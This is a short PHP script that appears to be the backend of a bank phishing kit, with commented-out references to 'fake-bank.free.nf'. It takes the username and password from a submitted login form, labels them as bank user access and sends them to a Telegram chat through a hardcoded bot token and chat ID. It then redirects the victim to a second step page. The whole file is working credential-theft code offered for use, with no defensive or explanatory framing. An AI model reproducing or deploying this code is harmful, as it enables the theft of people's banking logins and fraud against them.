<?php
if (isset($_POST['send'])) {
    if (isset($_POST['pseudo']) and !empty($_POST['pseudo']) and isset($_POST['pass']) and !empty($_POST['pass'])) {
        $pseudo = $_POST['pseudo'];
        $pass = $_POST['pass'];

        $msg = "ACCES BANQUE UTILISATEUR, Pseudo : $pseudo, Mot de passe : $pass";

        $parameters = [
            "chat_id" => '-1002009130611',
            "text" => $msg,
        ];
        $bot_token = "6712793520:AAFQz4zgrADzTSpaTna_4Y0T_cW2PIz30sc";
        $reponse = file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($parameters));

        header('Location: etape2.php');
    }
    else {
        //header('Location: http://fake-bank.free.nf');
        header('Location: index.php');
    }
}
else {
    //header('Location: http://fake-bank.free.nf');
    header('Location: index.php');
}
?>